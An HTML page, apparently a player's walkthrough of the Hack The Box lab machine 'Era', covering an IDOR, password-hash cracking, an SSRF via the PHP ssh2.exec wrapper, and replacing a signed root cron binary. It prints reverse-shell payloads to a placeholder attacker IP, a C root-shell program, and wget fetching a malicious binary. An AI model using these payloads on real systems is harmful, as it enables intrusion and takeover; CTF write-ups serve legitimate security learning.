@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Walkthrough: Era | A Professional Walkthrough</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/phosphor-icons"></script>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0A0C10;
+            color: #E6EDF3;
+        }
+        .container-main {
+            max-width: 80rem;
+            margin: 0 auto;
+        }
+        .font-mono {
+            font-family: 'Fira Code', monospace;
+        }
+        p {
+            line-height: 1.75;
+            color: #bdc5d0;
+            margin-bottom: 1rem;
+        }
+        h1, h2, h3 {
+            color: #ffffff;
+            font-weight: 700;
+        }
+        h2 {
+            font-size: 2rem;
+            padding-bottom: 0.75rem;
+            margin-top: 3rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            border-bottom: 2px solid;
+            border-image: linear-gradient(to right, #38BFBD, #0A0C10) 1;
+        }
+        h3 {
+            font-size: 1.5rem;
+            margin-top: 2.5rem;
+            margin-bottom: 1rem;
+            color: #58a6ff;
+        }
+        .code-block {
+            background-color: #161B22;
+            border: 1px solid #30363d;
+            border-radius: 0.5rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 14px 0 rgba(0,0,0,0.3);
+            overflow: hidden;
+            transition: all 0.3s ease-in-out;
+        }
+        .code-block:hover {
+            box-shadow: 0 6px 20px 0 rgba(56, 187, 253, 0.2);
+            transform: translateY(-2px);
+        }
+        .code-header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #21262D;
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid #30363d;
+            position: relative;
+        }
+        .code-header::before {
+            content: '';
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 54px;
+            height: 12px;
+            background-image: url("data:image/svg+xml,%3Csvg width='54' height='12' viewBox='0 0 54 12' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='6' cy='6' r='6' fill='%23FF5F56'/%3E%3Ccircle cx='27' cy='6' r='6' fill='%23FFBD2E'/%3E%3Ccircle cx='48' cy='6' r='6' fill='%2327C93F'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+        }
+        .code-title {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            color: #8D96A0;
+            text-transform: uppercase;
+        }
+         .copy-btn {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #161B22;
+            color: #8D96A0;
+            border: 1px solid #30363d;
+            padding: 0.25rem 0.75rem;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s ease-in-out;
+            opacity: 0.5;
+        }
+        .code-block:hover .copy-btn {
+            opacity: 1;
+        }
+        .copy-btn:hover {
+            background-color: #30363d;
+            color: #E6EDF3;
+        }
+        .code-block pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 0.9em;
+            padding: 1.25rem;
+            color: #E6EDF3;
+            line-height: 1.6;
+        }
+        .placeholder {
+            color: #FFBD2E;
+            font-weight: 600;
+        }
+        img {
+            border-radius: 0.5rem;
+            margin: 2rem auto;
+            border: 1px solid #30363d;
+            display: block;
+            max-width: 100%;
+            height: auto;
+        }
+        .caption {
+            font-size: 0.875rem;
+            color: #8D96A0;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            margin-top: -1.5rem;
+        }
+        .note {
+            padding: 1.25rem;
+            margin: 1.5rem 0;
+            border-radius: 0.375rem;
+            border-left-width: 4px;
+        }
+        .note-info {
+            background-color: rgba(56, 139, 253, 0.1);
+            border-left-color: #388BFD;
+        }
+        #toc {
+            position: sticky;
+            top: 2rem;
+        }
+        #toc a {
+            color: #8D96A0;
+            transition: all 0.2s ease-in-out;
+            border-left: 2px solid #30363d;
+        }
+        #toc a:hover, #toc a.active {
+            color: #58a6ff;
+            transform: translateX(4px);
+            border-left-color: #58a6ff;
+        }
+        .flag-container {
+            border: 1px dashed #30363d;
+            border-radius: 0.5rem;
+            padding: 1.5rem;
+            text-align: center;
+            margin: 2rem 0;
+        }
+        .flag-btn {
+            background-color: #388BFD;
+            color: white;
+            padding: 0.5rem 1.5rem;
+            border-radius: 0.375rem;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.2s ease-in-out;
+            border: none;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .flag-btn:hover {
+            background-color: #58a6ff;
+            transform: translateY(-2px);
+        }
+        #password-modal-overlay {
+            transition: opacity 0.3s ease;
+        }
+    </style>
+</head>
+<body class="p-4 sm:p-6 lg:p-8">
+
+    <div class="container-main grid grid-cols-12 gap-8">
+        <!-- Table of Contents -->
+        <aside class="hidden lg:block col-span-3">
+            <nav id="toc" class="space-y-3 pt-4">
+                <h3 class="font-bold text-white text-lg mb-4">Table of Contents</h3>
+                <a href="#introduction" class="block p-2 pl-4">Introduction</a>
+                <a href="#enumeration" class="block p-2 pl-4">Initial Enumeration</a>
+                <a href="#foothold" class="block p-2 pl-4">Foothold and user.txt</a>
+                <a href="#privesc" class="block p-2 pl-4">Privilege Escalation and root.txt</a>
+                <a href="#conclusion" class="block p-2 pl-4">Conclusion</a>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <div class="col-span-12 lg:col-span-9">
+            <header class="text-center py-16 rounded-lg bg-gradient-to-b from-[#161B22] to-[#0A0C10] border border-[#30363d] mb-12">
+                <img src="cropped_circle_image (2).png" alt="Era Machine Logo" class="h-24 w-24 mx-auto mb-4 border-0 rounded-full">
+                <h1 class="text-5xl font-bold text-white leading-tight">HackTheBox Era Walkthrough</h1>
+                <p class="text-xl text-gray-400 mt-2">by Keshav Kacholiya (DoodleX007) | September 27, 2025</p>
+                 <div class="flex justify-center gap-4 mt-4">
+                    <span class="bg-blue-500/20 text-blue-300 text-sm font-semibold px-3 py-1 rounded-full">OS: Linux</span>
+                </div>
+            </header>
+
+            <main>
+                <section id="introduction">
+                    <h2><i class="ph-info"></i>Introduction</h2>
+                    <p>This report details the penetration test of "Era," a Linux machine from Hack The Box. The methodology involves discovering a file upload service, exploiting an IDOR to retrieve web application source code and credentials, leveraging an SSRF vulnerability via a PHP wrapper for initial access, and finally, escalating privileges by replacing a signed binary that is executed by a root cron job.</p>
+                </section>
+                
+                <div class="note note-info">
+                    <p>💡 To all those who got stuck at ftp, don't worry, I gotchu.</p>
+                </div>
+
+                <section id="enumeration">
+                    <h2><i class="ph-magnifying-glass"></i>Initial Enumeration</h2>
+                    <p>We begin by adding `era.htb` to our `/etc/hosts` file and then running a full Nmap scan to identify open ports and services.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>nmap -A era.htb</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145001.png" alt="Nmap Scan Results">
+                    <p class="caption">Nmap reveals FTP, HTTP, and the main web application ports.</p>
+                    <p>The main website didn't have much, so I started looking for subdomains using ffuf.</p>
+                    <img src="Screenshot 2025-09-27 150856.png" alt="era.htb website">
+                    <p class="caption">The main website at http://era.htb.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>ffuf -w /path/to/wordlist.txt -H "Host: FUZZ.era.htb" -u http://era.htb</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145048.png" alt="ffuf subdomain enumeration">
+                    <p class="caption">ffuf discovers the 'file' subdomain.</p>
+                    <p>After adding `file.era.htb` to `/etc/hosts`, I ran gobuster to find directories and files on the new subdomain.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>gobuster dir -u http://file.era.htb/ -w /usr/share/wordlists/dirb/common.txt -x php</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145100.png" alt="gobuster directory enumeration">
+                    <p class="caption">gobuster finds several interesting PHP files, including register.php and upload.php.</p>
+                    <img src="Screenshot 2025-09-27 150933.png" alt="file.era.htb website">
+                    <p class="caption">The landing page for the `file.era.htb` subdomain.</p>
+                </section>
+                
+                <section id="foothold">
+                    <h2><i class="ph-key"></i>Foothold and user.txt</h2>
+                    <p>I registered a new user and proceeded to the file upload page.</p>
+                    <img src="8b85b64e-5d1d-4d2f-976a-0f67a5fffe4b.webp" alt="Upload successful page">
+                    <p class="caption">After uploading a file, the page provides a download link with a file ID.</p>
+                    <p>I noticed the download link used an `id` parameter. Changing this parameter resulted in a "File Not Found" error, suggesting a potential IDOR vulnerability.</p>
+                    <img src="Screenshot 2025-09-26 161224.png" alt="IDOR vulnerability test">
+                    <p class="caption">Testing the IDOR by manually changing the ID parameter to 1.</p>
+                    <p>I used Burp Suite Intruder to fuzz the `id` parameter from 1 to 2000 and found two valid file IDs: 54 and 150.</p>
+                    <img src="5b3faf42-df84-4360-b87e-ede75e54d3b0.webp" alt="Burp Intruder results">
+                    <p class="caption">Burp Intruder successfully identifies valid file IDs by looking for different response lengths.</p>
+                    <p>These IDs allowed me to download a site backup and a signing key archive.</p>
+                    <img src="c146d7e1-ddc6-4870-bbfa-396cb7bc8b0e.webp" alt="Downloading site backup">
+                    <p class="caption">Downloading `site-backup-30-08-24.zip` using ID 54.</p>
+                    <img src="b6e6ff84-f710-438e-921b-836b74b2fc0d.webp" alt="Downloading signing key">
+                    <p class="caption">Downloading `signing.zip` using ID 150.</p>
+                    <p>I extracted `site-backup-30-08-24.zip` and found a SQLite database file.</p>
+                    <img src="Screenshot 2025-09-27 151148.png" alt="Backup files listing">
+                    <p class="caption">The site backup contains several files, including `download.php` and `filedb.sqlite`.</p>
+                    <p>The database contained user hashes.</p>
+                    <img src="Screenshot 2025-09-26 161940.png" alt="SQLite database contents">
+                    <p class="caption">Viewing the user table in the SQLite database reveals usernames and password hashes.</p>
+                    <p>I used hashcat with the `rockyou.txt` wordlist to crack the hashes for users 'eric' and 'yuri'.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>hashcat -m 3200 eric_hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 3200 yuri_hash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145258.png" alt="Cracking eric's hash">
+                    <p class="caption">Cracking eric's password: `america`</p>
+                    <img src="Screenshot 2025-09-27 145314.png" alt="Cracking yuri's hash">
+                    <p class="caption">Cracking yuri's password: `mustang`</p>
+                    <div class="note note-info"><p>The passwords for the other users in the database were not found in the `rockyou.txt` wordlist.</p></div>
+                    <p>From the downloaded files, we got the `download.php` file, which contains the logic for file downloads.</p>
+                    <img src="Screenshot 2025-09-27 151315.png" alt="download.php source code">
+                    <p class="caption">The source code of `download.php` shows how it handles file requests.</p>
+                    <p>I logged into the FTP server as yuri.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>ftp era.htb</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145447.png" alt="FTP login">
+                    <p class="caption">Successfully logging into the FTP server as yuri.</p>
+                    <p>In there, we could access 2 directories `apache2_conf` and `php8.1_conf`, though we don't have write permissions. In the `php8.1_conf` directory, we find a file `ssh2.so`. This indicates that the `ssh2` extension for PHP is likely installed, which allows for SSH connections using PHP code.</p>
+                    <img src="4-ssh2-wrapped.png" alt="SSH2 Wrapper documentation">
+                    <p class="caption">The PHP documentation for the ssh2 wrapper, which shows the `ssh2.exec://` syntax for command execution.</p>
+                    <p>Now we need to find a way to exploit this. Reviewing `download.php` again, we can see it takes user input for the file path. We can test for command injection by manipulating the `format` parameter.</p>
+                    <img src="4-fopen-inject.png" alt="Testing command injection">
+                    <p class="caption">Using Burp Repeater to test a simple file read, which confirms we can control the file path.</p>
+                    <p>Since command injection works and the SSH2 wrapper is available, we can craft a payload for a reverse shell. To become admin, I used the `reset.php` page to change the security questions for the admin account.</p>
+                    <img src="223aa600-a179-4f67-b6d4-cf7dec19a0bf.webp" alt="Resetting admin security questions">
+                    <p class="caption">Taking over the admin account by updating their security questions.</p>
+                    <div class="note note-info"><p>To get RCE we need to execute this in the browser. Don't forget to change `<span class="placeholder">&lt;YOUR_IP&gt;</span>` to your own IP address.</p></div>
+                    <p>After logging in as admin, I crafted the final SSRF payload to get a reverse shell.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">URL</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20"bash%20-i%20>%26%20%2Fdev%2Ftcp%2F<span class="placeholder">&lt;YOUR_IP&gt;</span>%2F4444%200%3E%261%22;</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145533.png" alt="Executing SSRF payload">
+                    <p class="caption">The SSRF payload in the browser URL. The page times out, but the shell is delivered.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>nc -lnvp 4444</code></pre></div>
+                     <div class="flag-container">
+                        <button class="flag-btn" onclick="openPasswordModal('user')"><i class="ph-lock"></i> Show User Flag</button>
+                        <div id="user-flag-content" style="display: none;">
+                             <img src="Screenshot 2025-09-27 145554.png" alt="Getting user flag">
+                             <p class="caption">Getting a shell, switching to user 'eric', and capturing user.txt.</p>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="privesc">
+                    <h2><i class="ph-arrow-fat-up"></i>Privilege Escalation and root.txt</h2>
+                    <p>Running linpeas as eric revealed a group-writable directory and a process running as root from it.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>./linpeas.sh</code></pre></div>
+                    <img src="213241a5-365a-4b22-a45c-78961e742c36.webp" alt="Linpeas output">
+                    <p class="caption">Linpeas highlights the `/opt/AV/periodic-checks` directory and the `monitor` binary.</p>
+                    <img src="Screenshot 2025-09-27 145622.png" alt="Directory listing">
+                    <p class="caption">The `monitor` binary runs as root and is located in a directory where we have write permissions.</p>
+                    <p>The plan is to replace the `monitor` binary with a malicious one that gives us a root shell. The application requires the binary to be signed, so we'll use the key we found in `signing.zip`.</p>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-title">C</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                        <pre><code>#include &lt;unistd.h&gt;
+int main() {
+    setuid(0); setgid(0);
+    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<span class="placeholder">&lt;YOUR_IP&gt;</span>/1337 0>&1", NULL);
+    return 0;
+}</code></pre>
+                    </div>
+                    <p>I compiled the C code, then used a signing script and the extracted `key.pem` to sign the new binary.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>git clone https://github.com/NUAA-WatchDog/linux-elf-binary-signer.git
+cd linux-elf-binary-signer
+make clean
+gcc -o elf-sign elf_sign.c -lssl -lcrypto -Wno-deprecated-declarations
+x86_64-linux-gnu-gcc -o monitor exploit.c -static
+./elf-sign sha256 key.pem key.pem monitor</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145735.png" alt="Signing the malicious binary">
+                    <p class="caption">Compiling, signing, and preparing to host the malicious `monitor` binary.</p>
+                    <div class="note note-info"><p>Remember to start a python web server in this directory and replace `<span class="placeholder">&lt;YOUR_IP&gt;</span>` with your machine's IP address in the next step.</p></div>
+                    <p>On the target machine, I downloaded my malicious binary, replaced the original, and made it executable.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>wget http://<span class="placeholder">&lt;YOUR_IP&gt;</span>:8000/monitor.1
+rm monitor
+mv monitor.1 monitor
+chmod +x monitor</code></pre></div>
+                    <img src="Screenshot 2025-09-27 145754.png" alt="Replacing the monitor binary">
+                    <p class="caption">Replacing the legitimate `monitor` file with our reverse shell version.</p>
+                    <p>I started a final listener, and after a short wait, the cron job executed my binary, giving me a root shell.</p>
+                    <div class="code-block"><div class="code-header"><span class="code-title">BASH</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><pre><code>nc -lnvp 1337</code></pre></div>
+                    <div class="flag-container">
+                        <button class="flag-btn" onclick="openPasswordModal('root')"><i class="ph-lock"></i> Show Root Flag</button>
+                        <div id="root-flag-content" style="display: none;">
+                            <img src="Screenshot 2025-09-27 145806.png" alt="Getting root flag">
+                            <p class="caption">The root shell connects back, allowing us to capture the root flag.</p>
+                        </div>
+                    </div>
+                    <img src="Screenshot 2025-09-27 145834.png" alt="Era has been pwned">
+                    <p class="caption">Mission accomplished!</p>
+                </section>
+                
+                <section id="conclusion">
+                    <h2><i class="ph-flag-checkered"></i>Conclusion</h2>
+                    <p>The "Era" machine was an excellent challenge that demonstrated a realistic attack chain. The initial foothold was gained through careful enumeration and chaining an IDOR with an SSRF, while privilege escalation required understanding and manipulating a custom binary signing process. This machine reinforces the importance of secure coding practices, limiting information disclosure, and ensuring that any process with elevated privileges is properly secured.</p>
+                </section>
+
+            </main>
+
+            <footer class="text-center py-8 mt-12 border-t border-[#30363d]">
+                <p class="text-[#8b949e]">Thanks for reading the walkthrough. Hope you like it ! Do leave a comment for feedback or queries !!</p>
+            </footer>
+        </div>
+    </div>
+    
+    <!-- Password Modal -->
+    <div id="password-modal-overlay" class="fixed inset-0 bg-black bg-opacity-75 hidden items-center justify-center z-50 opacity-0">
+        <div id="password-modal" class="bg-[#161B22] border border-[#30363d] p-8 rounded-lg shadow-xl w-full max-w-sm">
+            <h3 class="text-xl font-bold text-white mb-4">Enter Password</h3>
+            <p class="text-[#8D96A0] mb-6">Enter the password to reveal the flag.</p>
+            <input type="password" id="password-input" class="w-full bg-[#0A0C10] border border-[#30363d] rounded-md px-3 py-2 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-[#388BFD]">
+            <p id="password-error" class="text-red-500 text-sm mt-2 hidden">Incorrect password. Please try again.</p>
+            <div class="mt-6 flex justify-end gap-4">
+                <button onclick="closePasswordModal()" class="bg-transparent border border-[#30363d] text-gray-300 px-4 py-2 rounded-md hover:bg-[#30363d] transition">Cancel</button>
+                <button onclick="checkPassword()" class="bg-[#388BFD] text-white px-4 py-2 rounded-md hover:bg-[#58a6ff] transition">Submit</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            let currentFlagType = '';
+
+            window.copyCode = function(button) {
+                const pre = button.parentElement.parentElement.querySelector('pre');
+                const code = pre.innerText;
+                navigator.clipboard.writeText(code).then(() => {
+                    button.innerHTML = 'Copied!';
+                    setTimeout(() => { button.innerHTML = 'Copy'; }, 2000);
+                }).catch(err => { console.error('Failed to copy text: ', err); });
+            }
+
+            window.openPasswordModal = function(flagType) {
+                currentFlagType = flagType;
+                const modalOverlay = document.getElementById('password-modal-overlay');
+                modalOverlay.classList.remove('hidden');
+                setTimeout(() => modalOverlay.classList.remove('opacity-0'), 10);
+                document.getElementById('password-input').focus();
+                document.getElementById('password-error').classList.add('hidden');
+            }
+
+            window.closePasswordModal = function() {
+                const modalOverlay = document.getElementById('password-modal-overlay');
+                modalOverlay.classList.add('opacity-0');
+                setTimeout(() => modalOverlay.classList.add('hidden'), 300);
+                document.getElementById('password-input').value = '';
+                currentFlagType = '';
+            }
+
+            window.checkPassword = function() {
+                const input = document.getElementById('password-input');
+                const errorMsg = document.getElementById('password-error');
+                if (input.value === 'doodle') {
+                    showFlag(currentFlagType);
+                    closePasswordModal();
+                } else {
+                    errorMsg.classList.remove('hidden');
+                }
+            }
+            
+            document.getElementById('password-input').addEventListener('keyup', function(event) {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    checkPassword();
+                }
+            });
+
+            function showFlag(flagType) {
+                const flagContent = document.getElementById(flagType + '-flag-content');
+                const button = flagContent.previousElementSibling;
+                button.style.display = 'none';
+                flagContent.style.display = 'block';
+            }
+
+            const sections = document.querySelectorAll('main section');
+            const navLinks = document.querySelectorAll('#toc a');
+
+            if (navLinks.length > 0) {
+                 navLinks[0].classList.add('active');
+            }
+
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const id = entry.target.getAttribute('id');
+                        navLinks.forEach(link => {
+                            link.classList.remove('active');
+                            if (link.getAttribute('href') === `#${id}`) {
+                                link.classList.add('active');
+                            }
+                        });
+                    }
+                });
+            }, { rootMargin: "-50% 0px -50% 0px" });
+
+            sections.forEach(section => {
+                observer.observe(section);
+            });
+        });
+    </script>
+</body>
+</html>
+
